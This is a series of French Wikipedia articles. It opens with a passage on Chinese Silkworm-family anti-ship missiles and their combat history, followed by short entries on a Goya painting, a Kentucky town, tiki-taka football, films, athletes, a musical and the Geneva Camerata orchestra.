Le SFQ-1 était un appareil d'expérimentations, démuni de charge militaire, ayant contribué au développement par les chinois de turboréacteurs de petite taille destinés à augmenter la portée de leurs missiles anti-navires. Ils permirent également de valider le mode de propulsion choisi pour équiper les missiles de croisière d'attaque terrestre YJ-4.
Le projet intégral fut nommé "Kunpeng" (鲲鹏) et démarra au début des années '70. Il visait à tester les mini-turboréacteurs WP-11 et FW-41, des copies de rétroingénierie des moteurs qui propulsaient les drones et missiles occidentaux.
YJ-4.
YJ-4 est le nom d'une famille de missiles de croisière d'attaque terrestre, développée par la Chine entre les années '70 et au début des années '80.
En raison du niveau technologique et industriel chinois limité à cette période, seule une quantité extrêmement réduite de missiles YJ-4 entra en service, la plupart servant d'ailleurs de base pour le développement d'armes futures plus efficaces, tel le missile Chang Feng. Deux versions de l'YJ-4 furent développées : l'YJ-4I, souvent désignée par-erreur YJ-41, et l'YJ-4II, elle aussi désignée par erreur YJ-42.
Les deux missiles ne diffèrent que par leurs groupes propulseurs. L'YJ-4I est équipé du moteur WP-11, la version chinoise du Turbomeca Marboré, alors que l'YJ-4II à portée plus importante était équipée d'un moteur deux fois plus puissant, le FW-41, la version chinoise du Teledyne CAE J69 américain, copiée à partir du moteur d'un drone "Firebee" perdu en territoire communiste.
XW-41.
L'XW-41, une version améliorée du HY-4, a été également développé. Cette ultime version de la famille des missiles C-201 est déclarée pouvant franchir une distance de , avec l'ajout d'un système de guidage GPS et GLONASS (le GPS russe). Pourtant, en raison de la disponibilité de systèmes similaires bien plus évolués, tels les missiles C-602, l'avenir du XW-41 et des autres missiles "Slikworm" parait bien difficile à cerner, même si ses essais ont été accomplis avec succès.
Même s'il est toujours officiellement un membre de la grande famille des "Silkworm's", les ingénieurs considèrent que ce missile est suffisamment différent des autres pour être classé dans une catégorie qui lui est propre, principalement en raison des hautes technologies dont il dispose. Après la fin de la guerre du Golfe, les Émirats arabes unis passèrent commande de 30 de ces engins pour la protection de leur littoral et, d'après le quotidien anglophone "Jane's Defence Weekly", ils seraient désignés par les émiratis par leur dénomination générique de . Les sources chinoises affirment, elles, que ces missiles étaient des XW-41, mais d'autres rapports font état de missiles appartenant à d'autres séries de la famille "Silkworm".
YJ-6 (C-601).
Le missile XW-41 et son prédécesseur HY-4 perdirent leurs promesses de vente dès que les guerres du Moyen-Orient furent cessées, ce qui entraîna une modification des plans de la part des chinois, qui décidèrent de convertir leurs XW-41 en missiles air-surface d'attaque de précision.
Les travaux de développement commencèrent au milieu des années '90, lorsque la "Sea Eagle Mechanical-Electrical Research Academy" (海鹰机电技术研究院) reçut un soutien de l'armée chinoise, et le projet fut achevé en 2002. Le missile qui en résulta fut nommé YJ-63, aussi connu sous le nom de C-603. En comparaison avec le XW-41, le guidage par radar actif original avait été remplacé par un système à télévision et les gouvernes en inversé avaient été remplacées par d'autres ayant une disposition en .
YJ-61 (C-611).
Le C-611 est la version améliorée du C-601 et autres anciens modèles air-surface de la famille "Silkworm".
Toutes les modifications effectuées ne sont pas forcément identiques, en-raison des différences entre les diverses versions, mais l'électronique de tous les modèles est portée au dernier standard existant. L'autodirecteur actif monopulse du missile est modernisé et inclut désormais des capacités de détection semi-active et passive. Le missile peut également être employé contre des cibles terrestres sur les côtes. Dans l'ensemble, l'altitude de croisière diminue et la portée augmente.
YJ-63 (KD-63).
Le KD-63 est la version la plus récente de la série YJ-63, entré en service entre 2004 et 2005.
Cette version d'attaque-au-sol est en apparence presque identique au C-603, excepté son cône de nez solide, remplaçant la vitre de l'ancien modèle guidé par TV. Cette spécificité indique que cette version du missile emploie un autre moyen de guidage, probablement un radar, mais le type exact de système employé demeure inconnu.
Histoire opérationnelle.
L'histoire opérationnelle des missiles "Silkworm" est principalement dominée par les faits d'armes de la version HY-2, dont la désignation OTAN est "Seersucker", pour la version terrestre, et "Silkworm", pour la version tirée depuis les navires (mais qui ne sera jamais employée de cette sorte).
Guerre Iran-Irak.
Le "Silkworm" se fit une renommée dans les années 1980, quand il fut employé par les deux camps en conflit, lors de la guerre Iran-Irak. Ces deux pays avaient été approvisionnés en armes par la Chine elle-même.
De février 1986 à avril 1988, les troupes iraniennes occupèrent la péninsule de Fao.
En 1987, l'Iran effectua son premier achat de missiles "Seersucker" et relança l'activité des usines à missiles irakiennes capturées sur la péninsule. Au-cours de cette même année 1987, l'Iran lança plusieurs missiles depuis les environs de la péninsule, dont certains parvinrent à toucher des navires étrangers, comme par-exemple le pétrolier libérien "Sungari" (ce navire était en-fait propriété des États-Unis). Un autre parvint à frapper le pétrolier battant pavillon américain "Sea Isle City", le à 5h30 du matin. Les réparations à effectuer, concernant la passerelle et la zone-vie de l'équipage, bloquèrent le navire à-quai pendant 4 mois. Lors de l'explosion du missile 18 membres de l'équipage furent blessés et le capitaine du navire, John Hunt, gardera comme séquelle une cécité totale, après avoir reçu des projections de verre au visage.
Plus-tôt dans l'année, cinq autres missiles avaient déjà frappé des zones du Koweït. En octobre 1987, le terminal pétrolier "off-shore" fut touché par un "Silkworm", qui fut observé comme provenant de la même péninsule de Fao. Cette attaque mena le Koweït à déployer une batterie de défense à missiles "Hawk" sur l'île de Failaka, afin de protéger ce terminal. En décembre de cette même année, un autre "Silkworm" iranien fut lancé contre ce terminal mais alla percuter une barge installée à-côté pour servir de leurre.
Avant ces attaques, la portée du missile avait été estimée comme étant inférieure à , mais ces assauts répétés prouvèrent que la portée réelle du missile dépassait aisément les . Les observateurs militaires koweïtiens avaient en-effet constaté que les missiles provenaient de la péninsule, en suivant leurs évolutions au radar, tandis-que les satellites américains avaient permis de confirmer la position des sites de lancement.
Au-cours de l'opération , menée en 1988 contre l'Iran, une batterie côtière iranienne lança deux missiles contre le navire américain USS "Gary" (FFG-51), le . Les deux furent brouillés par les mortiers lance-leurres Mk.36 de la frégate (ou tombèrent à court de carburant), et s'écrasèrent devant le navire. Cet incident fut source de confusions, certains officiels américains refusant d'avouer une quelconque attaque, alors que les deux missiles avaient bien été suivis pendant leurs évolutions par plusieurs unités, dont une qui avait carrément eu un contact visuel avec eux ! Deux autres missiles furent tirés (des "Silkworm's" ou des "Seersucker's") en direction de barges utilisées par la marine américaine dans le golfe Persique, mais manquèrent largement leur cible.
Seulement un mois plus tôt, en mars 1988, la Chine avait pourtant accepté de stopper l'approvisionnement de l'Iran en missiles HY-2. Mais il semblait que cette fourniture d'armes était toujours à-l'ordre du jour en 1989. Les iraniens ont depuis acquis la capacité à développer eux-mêmes leurs propres missiles.
Opération Tempête du désert.
Au mois d'août 1990, les irakiens avaient réparé les installations de Fao et disposaient de 84 missiles opérationnels, auxquels s'ajoutaient d'autres exemplaires en réserve à l'intérieur des terres.
Attaque de l'USS "Missouri".
Le , un lanceur basé à terre tira deux "Silkworm's" en direction du navire américain , qui était alors accompagné des navires USS "Jarrett" (FFG-33) et HMS "Gloucester" (D96). Les missiles furent détectés par le navire, qui activa ses mortiers lance-leurres Mk.36 mais fut dans l'impossibilité d'activer un seul de ses quatre systèmes de défense rapprochée Mk.15, car ils étaient alors en veille. Au Nord-Est du "Missouri", la frégate "Jarett" avait également détecté les missiles, mais ne pouvait les engager avec des missiles sol-air conventionnels car ils étaient trop proches pour pouvoir être accrochés au radar. Il activa alors son système Phalanx, mais ce dernier préféra accrocher les leurres du "Missouri" plutôt que de viser le premier des deux missiles.
Finalement, ce fut un missile Sea Dart lancé par le "Gloucester" qui détruisit le premier des deux missiles, après qu'il eut manqué le "Missouri" en le frôlant par l'Est. Le deuxième rata également sa cible et alla s'écraser en mer. Aucune mesure ne fut prise contre ce dernier par la Task Force, car il avait été jugé trop éloigné pour représenter un danger réel.
Un rapport irakien de l'incident, retrouvé après la fin du conflit, rapporta qu'un troisième missile avait été tiré contre le bâtiment américain, mais si tel était vraiment le cas, il est fort probable qu'il soit passé si loin de sa cible qu'il n'ait même pas été détecté par les systèmes de défense des navires alliés.
Au-cours de la campagne, le "Missouri" fut victime d'un incident de tir allié provenant de la frégate "Jarett".
D'après le rapport officiel, le canon d'autodéfense de Phalanx qui engagea les leurres (paillettes) du "Missouri" envoya des projectiles perdus dans la structure de ce dernier, l'un d'entre eux traversant une cloison et allant se loger dans un passage intérieur du navire. Un autre de ces projectiles alla percuter la partie avant du navire, au niveau de la salle d'accueil des hôtes, la traversant de part-en-part. L'un des marins présents à-bord fut touché au cou par des éclats et souffrit de blessures mineures.
Ceux qui sont familiers de l'incident demeurent sceptiques quant-à ce récit, le "Jarret" étant alors à plus de deux nautiques de distance au moment de l'incident, et les caractéristiques des leurres étant telles que le Phalanx ne devrait normalement pas les détecter comme une menace et les engager. Il ne fait aucun doute que les obus ayant touché le "Missouri" provenaient bien du "Jarett", et que ce fut bien un accident. La suspicion viendrait surtout du fait qu'un opérateur du "Jarett" aurait peut-être fait feu accidentellement en utilisant le système en manuel, alors qu'il était censé rester activé en mode automatique. Il n'existe cependant aucune preuve pour étayer cette théorie.
Installations dans une école.
Fin 1990 / début 1991, l'Irak érigea une installation de lancement et de ravitaillement en carburant de missiles, au sein de l'école pour filles des sciences de la ville d'Al-Badawiyah, en territoire koweïtien occupé. Ce site se trouve bien à-l'intérieur des terres, entre le Sud de la ville de Koweït et les quais des terminaux pétroliers d'Al-Shuaiba.
Même si elle était placée à un endroit bien plus stratégique que celles de la péninsule de Fao, cette installation ne fit rien du tout de tout le conflit. La garnison irakienne de la ville de Koweït était en-effet soumise à d'incessants bombardements aériens et maritimes alliés, et plus encore, l'attaque effectuée sur les réseaux de communications irakiens au-sein du Koweït occupé rendirent totalement impossible le moindre ciblage de navire dans le golfe. L'installation fut investie par les unités blindées des "Marines" américains en février 1991. 6 missiles "Seersucker" furent capturés, ainsi que deux camions-citerne Zil-131, deux chariots de contrôle et maintenance équipés du câblage nécessaire, un réservoir de carburant et un groupe électrogène chinois chargé d'alimenter le site en courant électrique.
Fin du conflit.
À la fin de l'opération Tempête du désert, les américains avaient réussi à investir tous les sites de la péninsule de Fao, situés dans les environs de la ville d'Umm Qasr. Toutes les installations furent détruites (réservoirs, rails lanceurs, groupes de puissance, etc.) et 30 missiles capturés furent rapatriés aux États-Unis en octobre 1991 (Ils ne représentent qu'une partie seulement des douzaines de missiles découverts). Une partie de ce butin fut dispersée dans plusieurs bases et sert actuellement de formation pour les équipages des différentes armées américaines, tandis-qu'un petit nombre fut emmené dans des laboratoires et sur l'aire d'expérimentations des armements de l'US Navy, à China Lake, afin de tester et vérifier leurs capacités.
Deuxième guerre du Congo.
Un très petit nombre de missiles HY-2 et de lanceurs fut délivré à ce pays, qui contrôle un minuscule bout d'océan, aux alentours de l'embouchure de la rivière Congo.
En 1997, un an avant le début officiel de la guerre, une source affirma que les troupes du Zaïre avaient tiré les missiles de manière irréfléchie, les utilisant comme des armes de bombardement non-guidées contre des positions rebelles. Bien évidemment cet usage s'apparente à du gaspillage, le "Seersucker" n'ayant absolument pas été conçu à cet effet, mais le manque d'entraînement évident des Zaïrois leur avait déjà fait faire des choix assez étranges, comme d'utiliser des obus antichar à charge creuse HEAT comme armes de bombardement indirect. Tenant compte de ces paramètres, l'éventualité qu'un usage de "Seersuckers" comme roquettes anti-matériel ait bien eu lieu peut paraître plausible.
Une autre source affirma, à-l'inverse, qu'ils étaient hors-d'usage depuis bien longtemps, en raison de négligences à la suite de la chute du gouvernement. Quoi qu'il en soit, il n'en reste plus aucun en service dans la RDC.
Guerre d'Irak de 2003.
Au-cours de la troisième Guerre du Golfe, en 2003, l'Irak utilisa le "Silkworm" comme missile sol-sol, contre des positions de la coalition au Koweït.
Au mois de mars, pas moins de 16 missiles avaient déjà été tirés. Les tirs irakiens étaient cependant si imprécis qu'aucun des 15 premiers ne parvint à créer de dommages sur les infrastructures koweïtiennes, ayant tous été interceptés en vol par des missiles "Patriot" ou ayant été perdus dans le désert. Seul le seizième missile parvint à tomber sur la ville d'Al-Kuwait, faisant deux blessés légers et d'importants dégâts dans l'un des centres commerciaux les plus importants de la ville, le souk "Charq".
Un des porte-paroles du ministère de la Défense, Youssef Al-Moulla, indiquait que Bagdad dissimulait des missiles "Silkworm" dans des zones résidentielles du sud de l'Irak. Il estimait leur portée entre . Les forces de la coalition, elles, tentaient de localiser la position exacte de ces missiles, supposés être placés dans la province de Bassorah, également au sud de l'Irak. Le colonel Chris Vernon, porte-parole militaire britannique, tenta tout de même de rassurer la population koweïtienne en précisant qu'ils étaient qu'ils ne touchaient que difficilement leurs cibles.
Conflit israélo-libanais de 2006.
Lors de la guerre du Liban de 2006, il fut d'abord rapporté que des groupes armés du Hezbollah avaient tiré un "Silkworm" contre un navire de guerre israélien depuis les terres libanaises. Les sources israéliennes affirmèrent par la suite que le missile utilisé était en réalité d'un modèle chinois bien plus sophistiqué, le C-701.
Il est à noter que la Syrie et l'Égypte avaient déjà employés des missiles P-15 Termit soviétiques - l'ancêtre du "Silkworm" - contre les navires israéliens, au cours de la guerre d'usure et de la guerre du Kippour. Si ces missiles n'avaient pas fait illusion lors de la bataille de Lattaquié en 1973, quatre d'entre eux parvinrent à couler le destroyer israélien "Eilat" en octobre 1967. Cet événement marqua le début d'une nouvelle ère, étant la première action réussie de missiles mer-mer au combat.
Alors qu'il n'était pas un missile particulièrement sophistiqué, surtout comparé aux dernières productions occidentales, telles le missile Exocet français, la charge militaire inhabituellement surdimensionnée du "Silkworm" permettait d'être assuré qu'un seul impact était capable d'infliger de très gros dégâts à sa cible.

</doc>
<doc id="7903746" url="https://fr.wikipedia.org/wiki?curid=7903746" title="L'Enclos des fous">
L'Enclos des fous

L’Enclos des fous (Espagnol: Corral de locos) est une petite peinture sur étain réalisée par Francisco de Goya entre 1793 et 1794. Goya affirma que cette œuvre était liée à ce type de scènes qu’il avait pu voir dans sa jeunesse dans une institution de Saragosse.
Contexte.
L’œuvre fut peinte approximativement lors de la déclaration de guerre de l’Espagne contre la France révolutionnaire, alors que Goya, atteint de surdité avait peur de sombrer dans la folie, était effrayé de cette entrée en guerre et se plaignait de sa santé. Un diagnostic de l’époque affirmait 
Cependant, Goya était très occupé avec des portraits royaux et de la cour. Cette œuvre fait partie d’une douzaine de petits tableaux sombres qu’il réalisa de façon autonome. C’était l’une des premières peintures de chevalet réalisées sans commande au milieu de la décennie 1790, dans laquelle ses études antérieures sur la beauté idéale permettent d’étudier la relation entre le naturalisme et le fantastique qui allait occuper le restant de sa carrière.
Le peintre était alors en pleine dépression nerveuse, le plongeant dans un état de maladif prolongé. On ne sait pas exactement de quoi Goya tomba malade ; une grande quantité d’hypothèse ont été formulées, depuis la poliomyélite jusqu’à la syphilis et même l’empoisonnement. Il vécut jusqu’à l’âge de 82 ans. Le peintre admit dans ses courriers, que cette série reflétait son doute intérieur, son anxiété et sa peur de la folie Ces tableaux lui servaient à 
Pour l’historien de l’art Arthur Danto, "l’Enclos des fous" marque une étape dans la carrière de Goya depuis . La toile est souvent comparée à des œuvres de maturité telle la Maison des fous datée de 1812-1819. Elle a été décrite comme une , comme une . Elle marque l’évolution d’un portraitiste de cour vers un artiste poursuivi par une humanité sombre et impitoyable.
Dans une lettre de 1794 à son ami Bernardo de Yriarte, il écrivit qu’il peignait . C’était le traitement usuel des fous, qui étaient enfermés avec des criminels, menottés et régulièrement sujets à des châtiments physiques. On note ici que les patients adoptent diverses postures, observation, assis, lutte, grimaçant. En haut du tableau tombe un soleil cru qui renforce l’atmosphère cauchemardesque de la scène.
L’un des objectifs des Lumières, mouvement auquel adhérait Goya, était une réforme des prisons et des asiles. Voltaire et d’autres écrivirent à ce sujet, condamnant la brutalité envers les prisonniers – fous ou non – thème que Goya repris dans diverses de ses toiles.
La peinture a fait partie d’une collection privée à partir de 1922 jusqu’à sa donation au Meadox Museum de Dallas par Algur H. Meadows en 1967.

</doc>
<doc id="7903751" url="https://fr.wikipedia.org/wiki?curid=7903751" title="Sharpsburg (Kentucky)">
Sharpsburg (Kentucky)

est une ville des États-Unis, située dans le comté de Bath dans l'État du Kentucky.
En 2010, sa population était de . Elle est intégrée dans l'.
Histoire.
Le vétéran de la guerre d'indépendance des États-Unis, Moses Sharp s'installe dans la région en 1780 et crée la ville de Bloomfield sur ses terres en 1814. Après sa mort en 1820, la ville reçoit son premier bureau de poste mais, entretemps, "Bloomfield" a été préempté par une autre communauté. Le maître de poste la nomme Sharp et la ville est établie et constituée sous ce nouveau nom.

</doc>
<doc id="7903753" url="https://fr.wikipedia.org/wiki?curid=7903753" title="Tiki-taka">
Tiki-taka

Le tiki-taka est un style de jeu footballistique, caractérisé par le mouvement continu du ballon autour d'une série de passes rapides. Le tiki-taka est une stratégie permettant la conservation du ballon ou la possession de balle. Ce style de jeu est principalement attribué au club catalan FC Barcelone, développé par Johan Cruyff (qui a entraîné ce club entre 1988 et 1996) et Pep Guardiola (2008-2012) ainsi qu'à l'équipe nationale espagnole de Luis Aragonés (2004-2008) et de son successeur Vicente del Bosque, ce dernier ayant mené l'équipe jusqu'au titre mondial et européen en 2010 puis 2012.
Historique.
Le commentateur de télévision serait à l'origine de cette expression utilisée pour la première fois sur la chaîne laSexta pendant la coupe du monde FIFA 2006. Lors de son commentaire en direct du match Espagne-Tunisie, Montes a utilisé ce terme pour décrire le style élégant des Espagnols : .
L'origine de ce mot serait peut-être une onomatopée ou bien dérivé du nom espagnol utilisé pour le tac-tac, un jouet des années 1970.
Après les défaites des Espagnols en phase de poules lors de la Coupe du monde 2014, et notamment leur humiliante défaite 1-5 contre les Pays-Bas, alors qu'ils étaient tenants du titre, l'efficacité du tiki-taka est remise en cause. 
Le , le Bayern Munich entraîné par Pep Guardiola, précurseur et fervent adepte du tiki-taka, est éliminé sur l'ensemble des deux confrontations en demi-finale de la Ligue des champions par l'Atletico Madrid de l'Argentin Diego Simeone. L'ensemble des critiques n'hésitera pas à proclamer la défaite du tiki-taka au profit du cholisme. Ce style de jeu rebaptisé en l'honneur de son concepteur, l'emblématique entraîneur des Colchoneros, Diego Simeone, surnommé « El Cholo », puise ses fondamentaux dans le catenaccio. Cette méthode de jeu est en effet basée sur une organisation défensive très solide et de redoutables contre-attaques.

</doc>
<doc id="7903755" url="https://fr.wikipedia.org/wiki?curid=7903755" title="Nuits blanches à Hambourg">
Nuits blanches à Hambourg

Nuits blanches à Hambourg (titre original : ) est un film allemand réalisé par Rolf Olsen, sorti en 1969.
Synopsis.
Ayant quitté la mer à cause de sa tristesse, Hannes retourne à St. Pauli, où il envisage de prendre sa retraite mais quand un de ses meilleurs amis se retrouve avec des ennuis, il décide de lui venir en aide.

</doc>
<doc id="7903757" url="https://fr.wikipedia.org/wiki?curid=7903757" title="Nikolaï Ouchikov">
Nikolaï Ouchikov

Nikolaï Ouchikov (en ) est un joueur bulgare de volley-ball né le à Pazardjik (oblast de Pazardjik). Il mesure et joue attaquant. Il est international bulgare.

</doc>
<doc id="7903763" url="https://fr.wikipedia.org/wiki?curid=7903763" title="Jozef Krnáč">
Jozef Krnáč

Jozef Krnáč (né le ) est un judoka slovaque. Il participe aux Jeux olympiques d'été de 2004 dans la catégorie des poids mi-légers et remporte la médaille d'argent. Au cours de sa carrière, il monte également à deux reprises sur un podium européen (2001, 2002).

</doc>
<doc id="7903770" url="https://fr.wikipedia.org/wiki?curid=7903770" title="La Nuit du meurtre">
La Nuit du meurtre

La Nuit du meurtre est un téléfilm français en deux parties écrit et réalisé par Serge Meynard en 2004 et diffusé les 7 et 8 mai 2005.
Synopsis.
Nathalie Castellane est découverte assassinée dans un marais. La veille, elle avait informé son frère de son mariage avec philippe Laclos, directeur du groupe Castellane...

</doc>
<doc id="7903771" url="https://fr.wikipedia.org/wiki?curid=7903771" title="On Your Toes (comédie musicale)">
On Your Toes (comédie musicale)

 est une comédie musicale américaine, créée à Broadway en 1936.
Argument.
Phil Dolan III (junior), passionné par la danse et le jazz, est titulaire d'une chaire de musique à l'université. Là, un groupe d'étudiants répète le ballet de jazz "Slaughter on Tenth Avenue" qui l'enthousiasme. Frankie Frayne, une de ses élèves amoureuse de lui, le met en contact avec Peggy Porterfield qui préside une compagnie de ballet russe, dont le directeur est Sergei Alexandrovitch. Peggy et Sergei, intéressés par le projet, proposent de monter un autre ballet "Princesse Zenobia", dont la vedette sera la danseuse étoile de la compagnie, Vera Barnova...

</doc>
<doc id="7903774" url="https://fr.wikipedia.org/wiki?curid=7903774" title="Geneva Camerata">
Geneva Camerata

Le Geneva Camerata (GECA) est un ensemble orchestral genevois fondé en par David Greilsammer et Céline Meyer et présidé par le journaliste Jean-Philippe Rapp.
Présentation.
Constitué de brillants musiciens issus de la jeune génération, le GECA se décrit comme un ensemble ouvert sur diverses cultures. L'orchestre propose une programmation éclectique et singulière, allant du baroque à la création contemporaine, en passant par le jazz, le rock et les musiques du monde. Reconnu par la presse comme l'un des orchestres les plus audacieux d'aujourd'hui, le Geneva Camerata créé également de nombreux spectacles multidisciplinaires alliant musique, danse, théâtre, cirque et arts visuels.
Dirigé par David Greilsammer, le Geneva Camerata a collaboré avec les plus grands solistes d'aujourd'hui, tels qu'Emmanuel Pahud, Gautier Capuçon, Jean-Guihen Queyras, Steven Isserlis, Isabelle Faust, Truls Mørk, Patricia Kopatchinskaja, Nemanja Radulovic, Andreas Scholl, Thomas Hampson, ainsi qu'avec les artistes jazz Richard Galliano, Didier Lockwood, Tigran Hamasyan, Avishai Cohen et Jacky Terrasson.
L'orchestre a également invité des artistes issus de l'univers du théâtre, tels que Lambert Wilson, Isabelle Adjani, Sophie Marceau ou encore Fanny Ardant. Les artistes Abd al Malik, Célia Kameni et Flèche Love ont aussi permis à GECA d'explorer l'univers des musiques actuelles.
L'année 2017 marque un tournant dans l'histoire du Geneva Camerata avec la création du spectacle "La Danse du Soleil" chorégraphié et interprété par le danseur Juan Kruz Díaz de Garaio Esnaola. Pour la première fois, les musiciennes et musiciens de l'orchestre dansent tout en jouant simultanément le chef-d'œuvre de Lully, "Le Bourgeois Gentilhomme." Cette performance, qui a fait l'objet d'une tournée internationale, a été plébiscitée par le New York Times comme l'un des plus beaux spectacles de l'année 2019.
Par la suite, GECA collabore avec d'autres grands chorégraphes tels que Marie-Claude Pietragalla ou encore Kader Attou, faisant des spectacles pluridisciplinaires l'une de ses signatures artistiques.
Vision artistique et projets.
Le GECA se plaît à confronter les styles et les époques, mais également à proposer des concerts pluridisciplinaires. Ces expériences uniques permettent une expérimentation des genres qui se décline sous différentes créations :
Saison 2013 - 2014.
Pour sa première saison, GECA a donné une trentaine de concerts. Il a aussi encouragé le travail d’écriture musicale de compositeurs en assurant l’exécution de nouvelles pièces.
L’orchestre a invité entre autres, le flûtiste Emmanuel Pahud, le violoncelliste Steven Isserlis ou encore le contreténor Andreas Scholl qui a interprété « Mentre Dormi », une nouvelle pièce pour contreténor et orchestre du jeune compositeur Matan Porat.
En janvier 2014, l’orchestre se dirige en direction des Sommets Musicaux de Gstaad pour un concert en compagnie du violoniste Daniel Hope et de la soprano Simone Kermes.
Le pianiste Yaron Herman, avec qui GECA a par la suite beaucoup collaboré, était également présent lors de la naissance de l’orchestre puisqu’il a participé à un set « de Mozart à Ellington ». Tandis que le clarinettiste Gilad Harel s’est prêté au jeu du « klezmerélectro », spectacle unissant des mélodies de Klezmer à des sonorités modernes et actuelles.
Par ailleurs, le compositeur de musique électronique et pianiste Francesco Tristano s’est produit cette année-là avec l’orchestre lors de l'ouverture d'Electron Festival à Genève, en entremêlant Jean-Sébastien Bach avec des créations électroniques.
Deux mois après sa création le GECA présente, dans le cadre d'une tournée internationale avec le mandoliniste Avi Avital, un concert sur le thème « Bach et sa famille » au Théâtre du Châtelet à Paris, au Kings Place de Londres et au Radial System de Berlin. Le soliste a interprété pour ces occasions des concertos pour flûte et clavecin - non pas sur leurs instruments d’origine, mais à la mandoline.
Ces différentes collaborations, dès la première année de l’orchestre, sont des signes marquants du désir de GECA de se vouloir éclectique afin de toucher un public plus large, en démocratisant et en renouvelant la discipline qu'est la musique classique.
Saison 2014 - 2015 / Le grand voyage.
Pour cette saison, GECA a souhaité inviter des personnalités telles que Richard Galliano, accordéoniste, le comédien et metteur en scène Omar Porras, le jazzman Jacky Terrasson, la soprano Véronique Gens ou encore le violoncelliste Johannes Moser.
De plus, musique et théâtre se sont entremêlés via l’hommage à Gabriel García Márquez puisqu’une pièce a été créée par le jeune compositeur Jannik Giger, basée sur des textes de Márquez. Par ailleurs, GECA a collaboré avec le Théâtre des Marionnettes de Genève dans le cadre d’un nouveau spectacle pour enfants, « Le Roi Arthur ». La danse était aussi au rendez-vous de par la collaboration de l’orchestre avec le Ballet Junior de Genève, ainsi qu’avec Cindy Van Acker et Kristen Debrock, deux chorégraphes de notre temps.
Les concerts "Sauvage" se sont quant à eux déclinés sous plusieurs formes en rendant hommage aux terres ensoleillées de Cuba en compagnie du percussionniste Reinaldo «Flecha» Delgado, mais aussi en transportant le public d'un monde à l'autre, de Monteverdi à Jimi Hendrix.
Du côté des collaborations, un projet a été fait avec l’Ensemble Contrechamps, interprète mondialement reconnu dans les répertoires des . D’autre part, GECA et le Grand Théâtre de Genève ont présenté un concert sur le thème de l’Amour, avec la participation de la Troupe des jeunes solistes en résidence du Grand Théâtre.
La tournée de cette saison a permis aux musiciens GECA de voyager en Turquie aux côtés de l'accordéoniste Martynas Levickis au Is Sanat Istanbul Concert Hall ou encore en Israël accompagnés du violoncelliste Steven Isserlis.
Saison 2015 - 2016 / Une pluie d'étoiles.
La troisième saison du Geneva Camerata s’est concrétisée par de nombreuses collaborations, avec notamment le violoncelliste Jean-Guihen Queyras, le jazzman Stefano Bollani, les violonistes Viktoria Mullova et Giuliano Carmignola, ou encore la soprano Sandrine Piau et le danseur Nicolas Cantillon lors du spectacle "Climax !". Une création à la découverte de nouvelles passerelles entre art lyrique, danse contemporaine, musique symphonique et création.
Les plus petits ont eu l'occasion de découvrir les aventures du Roi Arthur, grâce à une adaptation originale de l'opéra de Purcell avec marionnettes, lors de deux spectacles au Musée d'art et d'histoire de Genève.
Les concerts "Sauvage", ont entre autres exploré les musiques celtiques lors du concert "Les Vikings" ainsi que le Rap-Slam de David Granite lors du spectacle "Bach-Rap".
Les collaborations ont été variées, avec une soirée en hommage aux musiques new-yorkaises lors du Festival genevois Antigel et une carte blanche au grand Richard Galliano au Centre des arts de l’Ecole Internationale de Genève.
GECA s’est aussi produit pour la première fois au Festival Archipel pour un concert hommage au grand compositeur hongrois György Ligeti. Le chef Ludovic Morlot, Directeur musical de l'Orchestre Symphonique de Seattle, a été pour cette occasion le chef d’orchestre de cet événement.
D’autre part, la création "Balkan-Baroque", présentant une rencontre déjantée entre chefs-d'œuvre du baroque et musiques balkaniques a eu l’opportunité de tourner dans plusieurs festivals suisses, mais aussi en France et en Angleterre. 2015 et 2016 marquent également les débuts de GECA en Amérique Latine grâce à une tournée qui a mené l'orchestre au Centro Nacional de las Artes à Mexico - en l'honneur des 70 ans de relations diplomatiques entre la Suisse et le Mexique - ainsi qu'au Festival de Música de Morelia.
Saison 2016 - 2017 / L'île discrète.
Cette saison marque l’enregistrement du premier album de l’orchestre pour Sony Classical. Le programme, qui a également été donné en concert à la Philharmonie de Berlin, présente une rencontre musicale entre le monde du classique, du jazz et de l’improvisation, avec le pianiste Yaron Herman.
Outre cet événement notable, la quatrième saison GECA compte un certain nombre de collaborations avec entre autres la mezzo-soprano Anne Sofie von Otter, le violoniste jazz Didier Lockwood, la soprano Measha Brueggergosman qui a interprété des "Spirituals" afro-américains et des Lieder de Mahler. Les violonistes Nemanja Radulović et Christian Tetzlaff, le danseur Juan Kruz Díaz de Garaio Esnaola ou encore le pianiste jazz Tigran Hamasyan étaient également présents.
La danse, qui semble faire partie intégrante de l’univers de l’orchestre, a été cette année-là mise à l’honneur à travers une création chorégraphique du danseur-chorégraphe Juan Kruz Díaz de Garaio Esnaola invitant le violoniste Christian Tetzlaff, autour du Stabat Mater de Pergolèse avec Capucine Keller, Mélodie Ruvio et Inbal Oshman Dance group.
Par ailleurs, d’autres mondes artistiques ont été explorés lors des concerts Sauvage avec un hommage au Fado en compagnie de la chanteuse Mariana Correia, mais également aux Beatles. Autre univers plus surprenant, GECA a présenté des spectacles en jouant uniquement sur des instruments-jouets durant un concert en "Famille" et un concert "Sauvage". Le jeune public a aussi pu voir l’orchestre aux côtés de la compagnie Les Objets Volants puisque ce dernier a proposé un spectacle féerique entre cirque, jonglage et musique.
Du côté des tournées et des collaborations, après s’être produit dans plus de vingt-cinq villes à l'international, l’orchestre a fait lors de cette saison ses débuts en Asie. Invité par l’Oriental Art Center de Shanghai et par le National Centre for the Performing Arts à Pékin, GECA a présenté un programme éclectique allant de chefs-d'œuvre classiques à la création contemporaine, en passant par les musiques du monde aux côtés de Richard Galliano.
GECA a aussi voyagé en Israël avec la violoniste Viktoria Mullova et le jazzman Jacky Terrasson, mais également à Paris au Musée d’Orsay en compagnie de la chanteuse lyrique Véronique Gens.
Saison 2017 - 2018 / L'éveil des sens.
La cinquième saison de l’orchestre a présenté un certain nombre de créations regroupant de nombreuses collaborations, dont celles avec le violoncelliste Gautier Capuçon, le pianiste jazz Brad Mehldau, la violoniste Patricia Kopatchinskaja, les chanteurs lyriques Sara Mingardo et Thomas Hampson ou encore le comédien Lambert Wilson.
Pour le premier concert "Prestige" de cette saison, Lambert Wilson était la voix du concert «Raconte-moi l'Océan» aux côtés du violoncelliste Gautier Capuçon et de l’orchestre. Il s'est ainsi associé à la Plateforme Océan et Climat et à la COI-UNESCO pour faire entendre la voix de l'océan auprès du grand public.
